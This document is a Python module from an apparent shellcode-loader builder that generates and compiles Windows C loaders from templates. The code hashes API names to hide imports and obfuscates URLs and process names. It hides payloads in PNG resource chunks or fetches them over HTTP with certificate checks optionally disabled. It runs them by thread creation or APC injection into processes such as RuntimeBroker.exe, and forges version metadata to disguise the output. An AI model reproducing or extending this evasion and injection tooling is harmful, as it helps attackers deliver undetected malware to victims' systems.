import os
import subprocess
import sys
import uuid
import importlib
import random
import json
import re
from jinja2 import Environment, FileSystemLoader
from .png_chunker import chunk_bytecode_to_pngs

def _djb2_hash(s):
    """Calculates the DJB2 hash for a given string."""
    hash_val = 5381
    for char in s:
        hash_val = ((hash_val << 5) + hash_val) + ord(char)
    return hash_val & 0xFFFFFFFF # Return as a 32-bit unsigned integer

def _obfuscate_string(string_data, key):
    """Obfuscates a string using a byte-wise subtraction and returns a C-style byte array."""
    if not string_data:
        return ""
    obfuscated_bytes = bytearray()
    for char in string_data.encode('utf-8'):
        obfuscated_bytes.append((char - key) & 0xFF)
    return ", ".join([f"0x{byte:02x}" for byte in obfuscated_bytes])

def _get_api_hashes():
    """Returns a dictionary of all required API name hashes."""
    api_names = [
        "LoadLibraryA", "VirtualAlloc", "CreateThread", "WaitForSingleObject",
        "CloseHandle", "CreateFileMappingW", "MapViewOfFile", "GetProcessHeap",
        "RtlAllocateHeap", "HeapFree", "CreateFileA", "GetFileSize", "ReadFile",
        "RtlMoveMemory", "CreateDecompressor", "Decompress", "CloseDecompressor",
        "WinHttpOpen", "WinHttpConnect", "WinHttpOpenRequest", "WinHttpSendRequest",
        "WinHttpReceiveResponse", "WinHttpQueryDataAvailable", "WinHttpReadData",
        "WinHttpCloseHandle", "WinHttpCrackUrl", "WinHttpSetOption", "WinHttpQueryHeaders",
        "RtlZeroMemory", "FindResourceA", "LoadResource", "LockResource", "SizeofResource",
        "CreateProcessA", "VirtualAllocEx", "WriteProcessMemory", "QueueUserAPC", "ResumeThread",
        "lstrlenA", "GetEnvironmentVariableA", "VirtualProtectEx", "GetLastError",
        "NtCreateSection", "NtMapViewOfSection", "SleepEx", "NtCreateJobObject",
        "NtSetInformationJobObject", "NtAssignProcessToJobObject"
    ]
    module_names = ["KERNEL32.DLL", "NTDLL.DLL", "CABINET.DLL", "WINHTTP.DLL"]
    
    hashes = {}
    for name in api_names:
        hashes[f"hash_{name.lower()}"] = _djb2_hash(name)
    for name in module_names:
        key_name = name.replace('.', '_').lower()
        hashes[f"hash_{key_name}"] = _djb2_hash(name)
        
    return hashes

def _load_manifest_data():
    """Loads and parses the manifest.json file for versioninfo template data"""
    try:
        manifest_path = os.path.join(os.path.dirname(__file__), 'manifest.json')
        with open(manifest_path, 'r') as f:
            return json.load(f)
    except Exception as e:
        print(f"ERROR: Could not load or parse manifest.json: {e}", file=sys.stderr)
        return {"version_info_templates": {}}

def _prepare_template_context(options, manifest_data, payload_bytes=None):
    """Prepares the complete dictionary of variables to be passed to the Jinja2 template."""
    template_vars = {}
    
    # 1. Determine Global and Local Obfuscation Flags
    obfuscate_http_strings = options.get('obfuscate_http_strings') == 'true'
    obfuscate_execution_strings = options.get('obfuscate_execution_strings') == 'true'
    
    string_obfuscation_needed = obfuscate_http_strings or obfuscate_execution_strings
    template_vars['string_obfuscation_needed'] = string_obfuscation_needed

    if string_obfuscation_needed:
        key = random.randint(1, 255)
        template_vars['obfuscation_key'] = key

    # 2. API Resolver Context
    api_resolver_choice = options.get('api_resolver', 'string')
    template_vars['api_resolver'] = api_resolver_choice
    template_vars['api_resolver_partial'] = f"partials/api_resolver_{api_resolver_choice}.c.j2"
    if api_resolver_choice == 'hashed':
        template_vars.update(_get_api_hashes())

    # 3. Data Source Context
    data_source_choice = options.get('data_source', 'embedded')
    template_vars['data_source'] = data_source_choice
    if data_source_choice == 'embedded':
        template_vars['data_source_partial'] = "partials/datasource_image_chunks.c.j2"
        if payload_bytes:
            template_vars['embedded_data_size'] = len(payload_bytes)
        else:
            template_vars['embedded_data_size'] = 0
    else:
        template_vars['data_source_partial'] = f"partials/datasource_{data_source_choice}.c.j2"
    
    if data_source_choice == 'file':
        template_vars['file_path'] = options.get('file_path', '').replace('\\', '\\\\')
    elif data_source_choice == 'http':
        url = options.get('url', '')
        user_agent = options.get('user_agent', 'Mozilla/5.0')
        template_vars['obfuscate_http_strings'] = obfuscate_http_strings
        if obfuscate_http_strings:
            template_vars['url_obfuscated'] = _obfuscate_string(url, key)
            template_vars['user_agent_obfuscated'] = _obfuscate_string(user_agent, key)
        else:
            template_vars['url'] = url.replace('\\', '\\\\')
            template_vars['user_agent'] = user_agent
        template_vars['trust_invalid_cert'] = 1 if options.get('trust_invalid_cert') == 'true' else 0

    # 4. General Options
    output_format = options.get('output_format', 'exe')
    allocation_method_choice = options.get('allocation_method', 'virtualalloc')
    execution_method_choice = options.get('execution_method', 'newthread')

    template_vars.update({
        'allocation_method': allocation_method_choice,
        'execution_method': execution_method_choice,
        'allocation_partial': f"partials/alloc_{allocation_method_choice}.c.j2",
        'execution_partial': f"partials/exec_{execution_method_choice}.c.j2",
        'output_format': output_format,
        'export_name': 'CPlApplet' if output_format == 'cpl' else options.get('export_name', 'DllRegisterServer'),
        'debug_mode': (options.get('debug_mode') == 'true'),
        'bytecode_transformation': options.get('bytecode_encoding'),
        'bytecode_compression': options.get('bytecode_compression')
    })

    if execution_method_choice == 'remoteapc':
        target_process = options.get('target_process', 'RuntimeBroker.exe')
        template_vars['obfuscate_execution_strings'] = obfuscate_execution_strings
        if obfuscate_execution_strings:
            template_vars['target_process_obfuscated'] = _obfuscate_string(target_process, key)
        else:
            template_vars['target_process'] = target_process
    
    # 5. Version Info Logic
    template_vars['version_info_mode'] = 'none' 
    selected_template_name = options.get('version_info_template_select')
    
    version_templates = manifest_data.get("version_info_templates", {})
    sample_template = version_templates.get("exe", [{}])[0]
    
    final_version_info = {}

    if selected_template_name:
        template_vars['version_info_mode'] = 'template'
        all_templates = version_templates.get(output_format, [])
        selected_template = next((t for t in all_templates if t['name'] == selected_template_name), None)
        
        if selected_template:
            for key in sample_template.keys():
                if key == 'name': continue
                final_version_info[f'version_info_{key}'] = selected_template.get(key, '')

    elif options.get('version_info_company_name'):
        template_vars['version_info_mode'] = 'custom'
        for key in sample_template.keys():
            if key == 'name': continue
            final_version_info[f'version_info_{key}'] = options.get(f'version_info_{key}', '')
    
    if template_vars.get('version_info_mode') != 'none':
        file_ver_str = final_version_info.get('version_info_file_version') or '1.0.0.1'
        prod_ver_str = final_version_info.get('version_info_product_version') or '1.0.0.1'

        file_ver_nums_match = re.search(r'[\d\.]+', file_ver_str)
        prod_ver_nums_match = re.search(r'[\d\.]+', prod_ver_str)
        template_vars['version_info_file_version_nums'] = file_ver_nums_match.group(0) if file_ver_nums_match else '1.0.0.1'
        template_vars['version_info_product_version_nums'] = prod_ver_nums_match.group(0) if prod_ver_nums_match else '1.0.0.1'
        
        template_vars['version_info_file_version_str'] = file_ver_str
        template_vars['version_info_product_version_str'] = prod_ver_str
        
        for key, val in final_version_info.items():
            if key not in ['version_info_file_version', 'version_info_product_version']:
                 template_vars[key] = val
    
    return template_vars

def _run_subprocess(command, cwd, temp_file_to_debug=None, file_encoding='ascii'):
    """A simplified helper to run subprocesses, assuming ASCII/default encoding."""
    try:
        result = subprocess.run(
            command, check=True, capture_output=True, cwd=cwd, text=True, encoding=file_encoding, errors='replace'
        )
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        stderr_output = e.stderr
        print(f"ERROR: Build step failed. Stderr: {stderr_output}", file=sys.stderr)
        
        if temp_file_to_debug:
            print(f"--- DEBUG: FAILED FILE CONTENT ({temp_file_to_debug}) ---", file=sys.stderr)
            try:
                with open(temp_file_to_debug, 'r', encoding=file_encoding) as f_err:
                    print(f_err.read(), file=sys.stderr)
            except Exception as read_e:
                print(f"ERROR: Could not read failed file: {read_e}", file=sys.stderr)
            print("--- END DEBUG ---", file=sys.stderr)
        
        raise Exception(f"C compilation failed: {stderr_output}")

def _compile_payload_resources(payload_bytes, temp_files_to_clean):
    """Compiles the payload chunks (PNGs) into a resource object file."""
    if not payload_bytes:
        return None

    print("INFO: Compiling payload resources...")
    png_files = chunk_bytecode_to_pngs(payload_bytes, temp_files_to_clean)
    rc_content_payload = ""
    for i, png_file in enumerate(png_files):
        rc_content_payload += f'im{i} RCDATA "{os.path.basename(png_file)}"\n'
    
    if not rc_content_payload:
        return None

    temp_rc_filename = f"{uuid.uuid4()}_payload.rc"
    temp_rc_filepath = os.path.join('/tmp/uploads', temp_rc_filename)
    temp_files_to_clean.append(temp_rc_filepath)
    # Write as simple ASCII
    with open(temp_rc_filepath, "w", encoding="ascii") as f_rc:
        f_rc.write(rc_content_payload)

    temp_res_o_filename = f"{uuid.uuid4()}_payload.o"
    temp_res_o_filepath = os.path.join('/tmp/uploads', temp_res_o_filename)
    temp_files_to_clean.append(temp_res_o_filepath)
    windres_command = ["x86_64-w64-mingw32-windres", "-i", temp_rc_filepath, "-o", temp_res_o_filepath]
    
    _run_subprocess(windres_command, '/tmp/uploads', temp_file_to_debug=temp_rc_filepath, file_encoding='ascii')
    return temp_res_o_filepath

def _compile_version_info_resource(template_vars, env, temp_files_to_clean):
    """Compiles the Version Info into a separate resource object file."""
    if template_vars.get('version_info_mode') == 'none':
        return None

    print("INFO: Compiling version info resource...")
    try:
        version_template = env.get_template('versioninfo.rc.j2')
        rc_content_version = version_template.render(**template_vars)
    except Exception as e:
        print(f"ERROR: Failed to render versioninfo.rc.j2: {e}", file=sys.stderr)
        return None

    temp_rc_filename = f"{uuid.uuid4()}_version.rc"
    temp_rc_filepath = os.path.join('/tmp/uploads', temp_rc_filename)
    temp_files_to_clean.append(temp_rc_filepath)
    
    with open(temp_rc_filepath, "w", encoding="ascii") as f_rc:
        f_rc.write(rc_content_version)

    temp_res_o_filename = f"{uuid.uuid4()}_version.o"
    temp_res_o_filepath = os.path.join('/tmp/uploads', temp_res_o_filename)
    temp_files_to_clean.append(temp_res_o_filepath)
    
    windres_command = ["x86_64-w64-mingw32-windres", "-i", temp_rc_filepath, "-o", temp_res_o_filepath]
    
    _run_subprocess(windres_command, '/tmp/uploads', temp_file_to_debug=temp_rc_filepath, file_encoding='ascii')
    return temp_res_o_filepath

def _compile_c_source(c_source_code, temp_files_to_clean):
    """Compiles a C source string into an object file (.o) and returns the path."""
    temp_c_filename = f"{uuid.uuid4()}.c"
    temp_c_filepath = os.path.join('/tmp/uploads', temp_c_filename)
    temp_files_to_clean.append(temp_c_filepath)
    with open(temp_c_filepath, "w", encoding="utf-8") as f:
        f.write(c_source_code)
        
    temp_c_o_filename = f"{uuid.uuid4()}.o"
    temp_c_o_filepath = os.path.join('/tmp/uploads', temp_c_o_filename)
    temp_files_to_clean.append(temp_c_o_filepath)
    compile_command = ["x86_64-w64-mingw32-gcc", "-O2", "-c", temp_c_filepath, "-o", temp_c_o_filepath]
    
    print(f"INFO: Compiling C object with command: {' '.join(compile_command)}")
    _run_subprocess(compile_command, '/tmp/uploads', temp_file_to_debug=temp_c_filepath, file_encoding='utf-8')
    
    return temp_c_o_filepath

def _link_objects(object_files, options, original_filename, temp_files_to_clean):
    """Links object files into the final executable and returns the final artifact name."""
    output_format = options.get('output_format', 'exe')
    base_name, _ = os.path.splitext(original_filename)
    output_artifact_filename = f"{base_name}.{output_format}"
    
    temp_def_filename = None
    if output_format in ['dll', 'cpl']:
        export_name = 'CPlApplet' if output_format == 'cpl' else options.get('export_name', 'DllRegisterServer')
        def_content = f"EXPORTS\n    {export_name}"
        temp_def_filename = f"{uuid.uuid4()}.def"
        temp_def_filepath = os.path.join('/tmp/uploads', temp_def_filename)
        temp_files_to_clean.append(temp_def_filepath)
        with open(temp_def_filepath, "w") as f_def:
            f_def.write(def_content)

    linker_command = ["x86_64-w64-mingw32-gcc"]
    linker_command.extend(object_files)
    if options.get('debug_mode') != 'true':
        linker_command.append("-s")
    if output_format in ['dll', 'cpl']:
        linker_command.extend(["-shared", "-fvisibility=hidden", "-lkernel32"])
        if output_format == 'cpl':
            linker_command.append("-lshell32")
        if temp_def_filename:
            linker_command.append(temp_def_filepath)
    
    linker_command.extend(["-o", output_artifact_filename])
    
    print(f"INFO: Linking with command: {' '.join(linker_command)}")
    _run_subprocess(linker_command, '/tmp/uploads')
    
    return output_artifact_filename

def encode(input_filepath, original_filename, options):
    """
    Orchestrates the dynamic generation and compilation of the program.
    """
    print(f"INFO: Starting high-level compilation orchestration for '{original_filename}'")
    temp_files_to_clean = []
    try:
        manifest_data = _load_manifest_data()
        
        payload_bytes = b""
        if options.get('data_source') == 'embedded':
            if input_filepath and os.path.exists(input_filepath):
                with open(input_filepath, "rb") as f:
                    payload_bytes = f.read()
            else:
                print(f"WARN: input_filepath '{input_filepath}' not found or invalid, but data_source is 'embedded'.")
        
        template_vars = _prepare_template_context(options, manifest_data, payload_bytes)
        
        template_dir = os.path.join(os.path.dirname(__file__), 'templates')
        env = Environment(loader=FileSystemLoader(template_dir), trim_blocks=True, lstrip_blocks=True)
        
        template = env.get_template('base.c.j2')
        c_source_code = template.render(**template_vars)

        c_object_path = _compile_c_source(c_source_code, temp_files_to_clean)
        object_files_to_link = [c_object_path]
        
        if options.get('data_source') == 'embedded':
            payload_resource_path = _compile_payload_resources(
                payload_bytes, temp_files_to_clean
            )
            if payload_resource_path:
                object_files_to_link.append(payload_resource_path)
        
        version_resource_path = _compile_version_info_resource(
            template_vars, env, temp_files_to_clean
        )
        if version_resource_path:
            object_files_to_link.append(version_resource_path)
            
        final_artifact_name = _link_objects(
            object_files_to_link, options, original_filename, temp_files_to_clean
        )
        
        print(f"INFO: High-level compilation successful. Final artifact: {final_artifact_name}")
        return final_artifact_name
        
    except Exception as e:
        print(f"ERROR: A build step failed. Full error: {e}", file=sys.stderr)
        raise
    finally:
        print(f"INFO: Cleaning up {len(temp_files_to_clean)} temporary files.")
        for f_path in temp_files_to_clean:
            if os.path.exists(f_path):
                os.remove(f_path)
